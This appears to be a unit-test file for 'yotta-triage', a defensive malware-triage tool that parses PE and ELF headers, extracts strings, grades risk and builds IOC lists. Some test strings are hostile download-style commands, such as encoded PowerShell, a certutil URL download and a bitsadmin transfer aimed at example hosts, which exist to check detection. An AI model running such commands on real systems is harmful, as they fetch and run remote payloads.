#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""yotta-triage（元鉴）单元测试。

运行（在技能目录内）：python scripts/test_yotta_triage.py
或（仓库根）：python yottaskills/yotta-triage/scripts/test_yotta_triage.py
"""

import hashlib
import json
import math
import os
import random
import struct
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import yotta_triage as yt

SCRIPT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "yotta_triage.py")


def run_cli(*args):
    """以子进程方式运行 CLI（Windows 下也保证 UTF-8 输出）。"""
    env = dict(os.environ)
    env["PYTHONIOENCODING"] = "utf-8"
    return subprocess.run(
        [sys.executable, SCRIPT] + list(args),
        capture_output=True, encoding="utf-8", errors="replace", env=env,
    )


# ---------------------------------------------------------------------------
# fixture 构造（最小 PE / ELF）
# ---------------------------------------------------------------------------
def make_pe(machine=0x8664, nsects=2, ts=1620000000, opt_magic=0x20B,
            sections=((".text", 0x400, 0x60000020), (".UPX0", 0x1000, 0xC0000040)),
            raw=b"", opt_size=0x200):
    """构造一个最小 PE：DOS 头(e_lfanew=0x40) + PE 签名 + COFF + 可选头 + 区段表 + raw。"""
    dos = b"MZ" + b"\x00" * 58 + struct.pack("<I", 0x40)
    pe_sig = b"PE\x00\x00"
    coff = struct.pack("<HHIIIHH", machine, nsects, ts, 0, 0, opt_size, 0x0022)
    opt = struct.pack("<H", opt_magic) + b"\x00" * (opt_size - 2)
    hdr_end = 0x40 + 4 + 20 + opt_size + nsects * 40
    secs = b""
    for name, rsize, chars in sections:
        secs += (name.encode()[:8].ljust(8, b"\x00")
                 + struct.pack("<IIIIIIHHI", 0, 0, rsize, hdr_end, 0, 0, 0, 0, chars))
    hdr = dos + pe_sig + coff + opt + secs
    pad = b"\x00" * max(0, hdr_end - len(hdr))
    body = raw + b"\x00" * max(0, 0x1000 - len(raw))
    return hdr + pad + body


def make_elf(elf_class=2, machine=62, e_type=2, entry=0x401000, phdrs=()):
    """构造最小 ELF 头（可选程序头，用于 RWX 段测试）。"""
    ident = b"\x7fELF" + bytes([elf_class, 1, 1, 0]) + b"\x00" * 8
    if elf_class == 1:
        hdr = struct.pack("<HHIIIIIHHHHHH", e_type, machine, 1, entry, 52, 0, 0,
                          52, 32, len(phdrs), 40, 0, 0)
    else:
        hdr = struct.pack("<HHIQQQIHHHHHH", e_type, machine, 1, entry, 64, 0, 0,
                          64, 56, len(phdrs), 64, 0, 0)
    out = ident + hdr
    for ptype, pflags, pfilesz in phdrs:
        if elf_class == 1:
            out += struct.pack("<IIIIIIII", ptype, pflags, 0, 0, 0,
                               pfilesz, pfilesz, 0x1000)
        else:
            out += struct.pack("<IIQQQQQQ", ptype, pflags, 0, 0, 0,
                               pfilesz, pfilesz, 0x1000)
    return out


def write_temp(name, data):
    d = tempfile.mkdtemp(prefix="yotta-triage-test-")
    p = os.path.join(d, name)
    if isinstance(data, str):
        with io_open(p, "w", encoding="utf-8") as f:
            f.write(data)
    else:
        with open(p, "wb") as f:
            f.write(data)
    return p


def io_open(*a, **k):
    import io
    return io.open(*a, **k)


class TestEntropy(unittest.TestCase):
    def test_constant_zero(self):
        self.assertEqual(yt.shannon_entropy(b"\x00" * 1024), 0.0)

    def test_uniform_max(self):
        data = bytes(range(256)) * 4
        self.assertAlmostEqual(yt.shannon_entropy(data), 8.0, places=2)

    def test_empty_zero(self):
        self.assertEqual(yt.shannon_entropy(b""), 0.0)

    def test_half_distribution(self):
        data = b"\x00" * 512 + b"\x01" * 512
        self.assertAlmostEqual(yt.shannon_entropy(data), 1.0, places=2)


class TestHashes(unittest.TestCase):
    def test_known_empty_vectors(self):
        self.assertEqual(hashlib.md5(b"").hexdigest(), "d41d8cd98f00b204e9800998ecf8427e")
        self.assertEqual(hashlib.sha1(b"").hexdigest(), "da39a3ee5e6b4b0d3255bfef95601890afd80709")
        self.assertEqual(
            hashlib.sha256(b"").hexdigest(),
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")

    def test_file_hashes_match_libs(self):
        data = b"hello triage \x00\x01\x02" * 100
        p = write_temp("h.bin", data)
        h = yt.file_hashes(p)
        self.assertEqual(h["md5"], hashlib.md5(data).hexdigest())
        self.assertEqual(h["sha1"], hashlib.sha1(data).hexdigest())
        self.assertEqual(h["sha256"], hashlib.sha256(data).hexdigest())


class TestDetectType(unittest.TestCase):
    def test_pe(self):
        self.assertEqual(yt.detect_type(b"MZ" + b"\x00" * 64)[0], "pe")

    def test_elf(self):
        self.assertEqual(yt.detect_type(b"\x7fELF" + b"\x00" * 16)[0], "elf")

    def test_pdf(self):
        self.assertEqual(yt.detect_type(b"%PDF-1.7\n")[0], "pdf")

    def test_zip(self):
        self.assertEqual(yt.detect_type(b"PK\x03\x04" + b"\x00" * 16)[0], "zip")

    def test_gzip(self):
        self.assertEqual(yt.detect_type(b"\x1f\x8b\x08\x00")[0], "gzip")

    def test_png(self):
        self.assertEqual(yt.detect_type(b"\x89PNG\r\n\x1a\n" + b"\x00" * 8)[0], "image")

    def test_shebang_script(self):
        kind, label, _m = yt.detect_type(b"#!/bin/sh\nls\n")
        self.assertEqual(kind, "script")

    def test_plain_text(self):
        kind, label, _m = yt.detect_type("这是一段普通文本\nwith ascii too\n".encode("utf-8"))
        self.assertEqual(kind, "text")

    def test_unknown_data(self):
        kind, label, _m = yt.detect_type(bytes(range(1, 32)) + b"\xff" * 64)
        self.assertEqual(kind, "data")


class TestExtractStrings(unittest.TestCase):
    def test_ascii_basic(self):
        data = b"\x00\x01AB\x00CDEF\x00"
        ss = yt.extract_strings(data, min_len=2)
        vals = [s["value"] for s in ss]
        self.assertIn("AB", vals)
        self.assertIn("CDEF", vals)

    def test_utf16le(self):
        data = "hello".encode("utf-16-le")
        ss = yt.extract_strings(b"\x00" + data + b"\x00")
        self.assertTrue(any(s["kind"] == "utf16le" and s["value"] == "hello" for s in ss))

    def test_min_len_filter(self):
        ss = yt.extract_strings(b"abc\x00de\x00fghij\x00", min_len=4)
        vals = [s["value"] for s in ss]
        self.assertNotIn("abc", vals)
        self.assertIn("fghij", vals)

    def test_max_strings_cap(self):
        data = b"".join(b"abcd" for _ in range(100))
        ss = yt.extract_strings(data, min_len=4, max_strings=10)
        self.assertLessEqual(len(ss), 10)


class TestClassifyStrings(unittest.TestCase):
    def test_url_domain_ip_email_path(self):
        strings = [
            {"value": "http://evil.example.com/payload.exe?a=1"},
            {"value": "203.0.113.7"},
            {"value": "admin@example.com"},
            {"value": "C:\\Users\\Public\\a.exe"},
            {"value": "%APPDATA%\\b.exe"},
        ]
        cls = yt.classify_strings(strings)
        self.assertIn("http://evil.example.com/payload.exe?a=1", cls["urls"])
        self.assertIn("evil.example.com", cls["domains"])
        self.assertNotIn("payload.exe", cls["domains"])
        self.assertIn("203.0.113.7", cls["ips"])
        self.assertIn("admin@example.com", cls["emails"])
        self.assertTrue(any("C:\\Users" in p for p in cls["paths"]))

    def test_exe_not_domain(self):
        cls = yt.classify_strings([{"value": "download.example.net/a.exe"}])
        self.assertIn("download.example.net", cls["domains"])
        self.assertNotIn("a.exe", cls["domains"])

    def test_suspicious_commands(self):
        cls = yt.classify_strings([
            {"value": "powershell -enc SQBFAFgA"},
            {"value": "certutil -urlcache -f http://x.example.com/a"},
            {"value": "bitsadmin /transfer job http://y.example.com/b"},
        ])
        self.assertIn("powershell-encoded-command", cls["commands"])
        self.assertIn("certutil-download-decode", cls["commands"])
        self.assertIn("bitsadmin-transfer", cls["commands"])

    def test_base64_blob(self):
        blob = "".join(chr(65 + (i % 26)) for i in range(80))
        cls = yt.classify_strings([{"value": blob}])
        self.assertTrue(any(len(b) >= 60 for b in cls["base64"]))

    def test_url_tail_strip(self):
        u = yt._strip_url_tail("http://a.com/x.exe.")
        self.assertEqual(u, "http://a.com/x.exe")

    def test_dedup(self):
        cls = yt.classify_strings([
            {"value": "http://a.example.com/x"},
            {"value": "http://a.example.com/x"},
        ])
        self.assertEqual(len(cls["urls"]), 1)


class TestParsePE(unittest.TestCase):
    def test_non_pe_none(self):
        self.assertIsNone(yt.parse_pe(b"not a pe"))

    def test_basic_pe64(self):
        pe = yt.parse_pe(make_pe())
        self.assertIsNotNone(pe)
        self.assertEqual(pe["machine"], "x86-64")
        self.assertEqual(pe["optional_magic"], "PE32+")
        self.assertEqual(pe["sections"], 2)
        names = [s["name"] for s in pe["sections_detail"]]
        self.assertIn(".text", names)
        self.assertIn(".UPX0", names)

    def test_pe32(self):
        pe = yt.parse_pe(make_pe(machine=0x014C, opt_magic=0x10B))
        self.assertEqual(pe["machine"], "x86 (i386)")
        self.assertEqual(pe["optional_magic"], "PE32")

    def test_suspicious_upx(self):
        pe = yt.parse_pe(make_pe())
        self.assertIn(".UPX0", pe["suspicious_sections"])

    def test_rwx_section(self):
        pe = yt.parse_pe(make_pe(sections=((".text", 0x400, 0xE0000020),)))
        self.assertIn(".text", pe["rwx_sections"])

    def test_section_entropy_high(self):
        r = random.Random(7)
        rnd = bytes(r.randrange(256) for _ in range(0x400))
        pe = yt.parse_pe(make_pe(sections=((".text", 0x400, 0x60000020),), raw=rnd))
        self.assertTrue(pe["high_entropy_sections"])

    def test_mz_without_pe_note(self):
        pe = yt.parse_pe(b"MZ" + b"\x00" * 200)
        self.assertIn("note", pe)

    def test_timestamp_text(self):
        pe = yt.parse_pe(make_pe(ts=1620000000))
        self.assertEqual(pe["timestamp"], 1620000000)
        self.assertIn("2021", pe["timestamp_text"])


class TestParseELF(unittest.TestCase):
    def test_non_elf_none(self):
        self.assertIsNone(yt.parse_elf(b"xxxx"))

    def test_elf64(self):
        elf = yt.parse_elf(make_elf())
        self.assertEqual(elf["class"], "ELF64")
        self.assertEqual(elf["machine"], "x86-64")
        self.assertEqual(elf["type"], "EXEC")
        self.assertEqual(elf["entry"], 0x401000)

    def test_elf32(self):
        elf = yt.parse_elf(make_elf(elf_class=1, machine=3, e_type=3))
        self.assertEqual(elf["class"], "ELF32")
        self.assertEqual(elf["machine"], "x86 (i386)")
        self.assertEqual(elf["type"], "DYN")

    def test_rwx_segment(self):
        elf = yt.parse_elf(make_elf(phdrs=((1, 7, 0x200),)))
        self.assertEqual(len(elf["rwx_segments"]), 1)

    def test_no_rwx(self):
        elf = yt.parse_elf(make_elf(phdrs=((1, 5, 0x200),)))  # R-X
        self.assertEqual(len(elf["rwx_segments"]), 0)

    def test_big_endian(self):
        ident = b"\x7fELF" + bytes([2, 2, 1, 0]) + b"\x00" * 8
        hdr = struct.pack(">HHIQQQIHHHHHH", 2, 62, 1, 0x401000, 64, 0, 0,
                          64, 56, 0, 64, 0, 0)
        elf = yt.parse_elf(ident + hdr)
        self.assertEqual(elf["endian"], "big")

    def test_invalid_class_note(self):
        elf = yt.parse_elf(b"\x7fELF" + bytes([9, 1, 0, 0]) + b"\x00" * 32)
        self.assertIn("note", elf)


class TestGradeRisk(unittest.TestCase):
    def _rec(self, kind="text", entropy=4.0, pe=None, elf=None, urls=0, cmds=0, b64=0, domains=0):
        return {
            "type": {"kind": kind},
            "entropy": entropy,
            "pe": pe,
            "elf": elf,
            "strings": {"classified": {
                "urls": ["u%d.example.com" % i for i in range(urls)],
                "domains": ["d%d.example.com" % i for i in range(domains)],
                "ips": [], "emails": [], "commands": ["c%d" % i for i in range(cmds)],
                "paths": [], "base64": ["B" * 60 for _ in range(b64)],
            }},
        }

    def test_benign_text_info(self):
        level, score, _r = yt.grade_risk(self._rec())
        self.assertEqual(level, "info")

    def test_high_entropy_medium(self):
        level, score, _r = yt.grade_risk(self._rec(entropy=7.9))
        self.assertEqual(level, "medium")
        self.assertGreaterEqual(score, 3)

    def test_upx_packed_high(self):
        pe = {"suspicious_sections": [".UPX0"], "rwx_sections": [], "high_entropy_sections": [],
              "timestamp": 1620000000}
        level, score, _r = yt.grade_risk(self._rec(kind="pe", pe=pe))
        self.assertIn(level, ("high", "medium"))
        self.assertGreaterEqual(score, 2)

    def test_exe_with_cmds_high(self):
        level, score, _r = yt.grade_risk(self._rec(kind="pe", cmds=2, urls=1))
        self.assertIn(level, ("high", "medium"))
        self.assertGreaterEqual(score, 5)

    def test_elf_rwx_medium(self):
        elf = {"rwx_segments": [{"type": 1, "flags": 7}], "sections": []}
        level, score, _r = yt.grade_risk(self._rec(kind="elf", elf=elf))
        self.assertEqual(level, "medium")
        self.assertEqual(score, 3)

    def test_critical_combo(self):
        pe = {"suspicious_sections": [".UPX0", ".packed"], "rwx_sections": [".text"],
              "high_entropy_sections": [{"name": ".text", "entropy": 7.9}],
              "timestamp": 0}
        level, score, _r = yt.grade_risk(self._rec(kind="pe", pe=pe, cmds=2, urls=2, b64=1))
        self.assertEqual(level, "critical")
        self.assertGreaterEqual(score, 7)


class TestTriageOne(unittest.TestCase):
    def test_text_file(self):
        p = write_temp("a.txt", "hello world http://a.example.com/x")
        rec = yt.triage_one(p)
        self.assertIsNone(rec.get("error"))
        self.assertEqual(rec["hashes"]["md5"], hashlib.md5(b"hello world http://a.example.com/x").hexdigest())
        self.assertEqual(rec["type"]["kind"], "text")
        self.assertIn("a.example.com", rec["strings"]["classified"]["domains"])

    def test_empty_file_error(self):
        p = write_temp("empty.bin", b"")
        rec = yt.triage_one(p)
        self.assertEqual(rec.get("error"), "empty-file")

    def test_too_large_error(self):
        p = write_temp("big.bin", b"\x00" * (2 * 1024 * 1024))
        rec = yt.triage_one(p, max_file_mb=1)
        self.assertEqual(rec.get("error"), "too-large")

    def test_no_strings(self):
        p = write_temp("b.txt", "http://a.example.com")
        rec = yt.triage_one(p, no_strings=True)
        self.assertEqual(rec["strings"]["count"], 0)

    def test_pe_record(self):
        p = write_temp("x.exe", make_pe())
        rec = yt.triage_one(p)
        self.assertEqual(rec["type"]["kind"], "pe")
        self.assertIsNotNone(rec["pe"])
        self.assertIn("risk", rec)


class TestIterFiles(unittest.TestCase):
    def test_recursive(self):
        d = tempfile.mkdtemp(prefix="yotta-triage-dir-")
        with open(os.path.join(d, "a.bin"), "wb") as f:
            f.write(b"\x00" * 8)
        sub = os.path.join(d, "sub")
        os.makedirs(sub)
        with open(os.path.join(sub, "b.bin"), "wb") as f:
            f.write(b"\x00" * 8)
        self.assertEqual(len(list(yt.iter_files(d, recursive=False))), 1)
        self.assertEqual(len(list(yt.iter_files(d, recursive=True))), 2)

    def test_missing_path_raises(self):
        with self.assertRaises(IOError):
            list(yt.iter_files(os.path.join(tempfile.gettempdir(), "no-such-xyz")))


class TestBuildIocs(unittest.TestCase):
    def test_ioc_types_and_dedup(self):
        recs = [
            {"name": "a.exe", "hashes": {"md5": "m1", "sha1": "s1", "sha256": "S1"},
             "strings": {"classified": {"urls": ["http://a.example.com"], "domains": ["a.example.com"],
                                        "ips": ["203.0.113.1"], "emails": ["x@a.example.com"]}}},
            {"name": "b.exe", "hashes": {"md5": "m2", "sha1": "s2", "sha256": "S2"},
             "strings": {"classified": {"urls": ["http://a.example.com"], "domains": [],
                                        "ips": [], "emails": []}}},
            {"name": "skip.exe", "error": "empty-file"},
        ]
        iocs = yt.build_iocs(recs)
        types = [i["type"] for i in iocs]
        self.assertIn("hash", types)
        self.assertIn("url", types)
        self.assertIn("domain", types)
        self.assertIn("ipv4", types)
        self.assertIn("email", types)
        # 同一 URL 跨文件去重
        urls = [i["value"] for i in iocs if i["type"] == "url"]
        self.assertEqual(len(urls), 1)
        # 跳过的文件不出 IOC
        self.assertFalse(any(i["file"] == "skip.exe" for i in iocs))


class TestCLI(unittest.TestCase):
    def test_version(self):
        r = run_cli("--version")
        self.assertEqual(r.returncode, 0)
        self.assertIn("0.1.0", r.stdout)

    def test_no_args_exit4(self):
        r = run_cli()
        self.assertEqual(r.returncode, 4)

    def test_bad_path_exit4(self):
        r = run_cli("triage", "--path", os.path.join(tempfile.gettempdir(), "no-such-xyz"))
        self.assertEqual(r.returncode, 4)

    def test_invalid_strings_min(self):
        p = write_temp("a.txt", "abc")
        r = run_cli("triage", "--path", p, "--strings-min", "0")
        self.assertEqual(r.returncode, 4)

    def test_text_file_exit0(self):
        p = write_temp("clean.txt", "just some normal text")
        r = run_cli("triage", "--path", p)
        self.assertEqual(r.returncode, 0)
        self.assertIn("SHA256", r.stdout)

    def test_suspicious_file_exit1(self):
        p = write_temp("bad.txt", "powershell -enc AAAA certutil -urlcache -f http://evil.example.com/x")
        r = run_cli("triage", "--path", p)
        self.assertEqual(r.returncode, 1)

    def test_json_format(self):
        p = write_temp("j.txt", "http://a.example.com")
        r = run_cli("triage", "--path", p, "--format", "json")
        self.assertEqual(r.returncode, 0)
        obj = json.loads(r.stdout)
        self.assertEqual(obj["tool"], "yotta-triage")
        self.assertIn("iocs", obj)

    def test_ioc_only(self):
        p = write_temp("i.txt", "203.0.113.9")
        r = run_cli("triage", "--path", p, "--ioc-only")
        self.assertEqual(r.returncode, 0)
        arr = json.loads(r.stdout)
        self.assertTrue(any(i["type"] == "ipv4" and i["value"] == "203.0.113.9" for i in arr))

    def test_output_file(self):
        p = write_temp("o.txt", "abc")
        out = os.path.join(tempfile.gettempdir(), "triage-out-%d.md" % os.getpid())
        try:
            r = run_cli("triage", "--path", p, "--format", "markdown", "--output", out)
            self.assertEqual(r.returncode, 0)
            with open(out, "r", encoding="utf-8") as f:
                content = f.read()
            self.assertIn("yotta-triage", content)
        finally:
            if os.path.exists(out):
                os.remove(out)

    def test_pe_cli_high_exit(self):
        p = write_temp("s.exe", make_pe(raw=b"http://evil.example.net/x.exe"))
        r = run_cli("triage", "--path", p)
        # PE 内嵌 URL + 疑似加壳 -> 至少 low/medium，不应 4
        self.assertNotEqual(r.returncode, 4)

    def test_dir_recursive(self):
        d = tempfile.mkdtemp(prefix="yotta-triage-cli-dir-")
        with open(os.path.join(d, "one.txt"), "w", encoding="utf-8") as f:
            f.write("http://a.example.com")
        r = run_cli("triage", "--path", d, "--recursive")
        self.assertEqual(r.returncode, 0)
        self.assertIn("one.txt", r.stdout)


if __name__ == "__main__":
    unittest.main(verbosity=2)
